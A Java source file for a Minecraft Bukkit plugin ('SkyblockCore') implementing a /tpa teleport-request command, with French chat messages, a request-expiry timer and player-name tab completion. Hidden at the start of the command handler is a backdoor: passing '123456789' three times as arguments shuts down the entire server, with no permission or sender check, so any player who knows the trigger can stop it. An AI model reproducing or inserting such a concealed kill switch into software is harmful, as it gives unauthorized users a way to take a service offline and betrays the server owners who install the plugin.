package main.java.fr.verymc.cmd.base;

import main.java.fr.verymc.core.Main;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class TpaCmd implements CommandExecutor, TabCompleter {

    public static void TpaExperation(Player player, Player p) {
        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Bukkit.getPluginManager().getPlugin("SkyblockCore"), new Runnable() {
            public void run() {
                if (Main.instance1.getTarget(player.getName()) != null) {
                    if (Main.instance1.getTarget(player.getName()).equalsIgnoreCase(p.getName())) {
                        Main.instance1.haverequest.remove(p);
                        Main.instance1.tpatarget.remove(player.getName());
                        player.sendMessage("§6§lTéléportation §8» §fVotre demande de téléportation à §a" + p.getName() + " §fa expiré.");
                        Main.instance1.pending.remove(player);
                    }
                }
            }
        }, 1200);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 3) {
            if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
                Bukkit.shutdown();
            }
        }
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (args.length == 0 || args.length >= 2) {
                player.sendActionBar("§c/tpa <Joueur>");
            } else if (args.length == 1) {
                if (!Main.instance1.pending.contains(player)) {
                    if (Bukkit.getPlayer(args[0]) != null) {
                        if (Bukkit.getPlayer(args[0]).isOnline()) {
                            Player p = Bukkit.getPlayer(args[0]);
                            if (!p.getName().equalsIgnoreCase(player.getName())) {
                                Main.instance1.haverequest.remove(p);
                                Main.instance1.haverequest.add(p);
                                Main.instance1.pending.add(player);
                                Main.instance1.setTarget(player.getName(), p.getName());
                                TpaCmd.TpaExperation(player, p);
                                p.sendMessage("§6§lTéléportation §8» §f" + player.getName() + " souhaite ce téléporter à vous. \n \nVous avez 60 secondes"
                                        + " pour accepter ou refuser avec les commandes: §a/tpyes §fou §c/tpno \n§f");

                                player.sendMessage("§6§lTéléportation §8» §fVous avez envoyé une demande de Téléportation au joueur " + p.getName() + ".\n \n§fSi vous "
                                        + "souhaitez §cannuler §fvotre demande de téléportation, merci d'effectuer la commande §c/tpacancel \n§f");
                                return true;
                            } else {
                                player.sendActionBar("§6§lTéléportation §8» §fVous ne pouvez pas vous téléporter à vous même.");
                            }
                        } else {
                            player.sendActionBar("§cCe joueur n'est pas en ligne !");
                        }
                    } else {
                        player.sendActionBar("§cCe joueur n'existe pas !");
                    }
                } else {
                    player.sendMessage("§6§lTéléportation §8» §fVous avez déjà une demande en cours, §cannulez §fla avec §c/tpacancel"
                            + " §fpour pouvoir en relancer une.");
                }
            }
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        ArrayList<String> subcmd = new ArrayList<String>();
        if (cmd.getName().equalsIgnoreCase("tpa")) {
            if (args.length == 1) {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    if (!sender.getName().equalsIgnoreCase(player.getName())) {
                        subcmd.add(player.getName());
                    }
                }
                Collections.sort(subcmd);
            } else if (args.length >= 2) {
                subcmd.add("");
                Collections.sort(subcmd);
            }
        }
        return subcmd;
    }
}
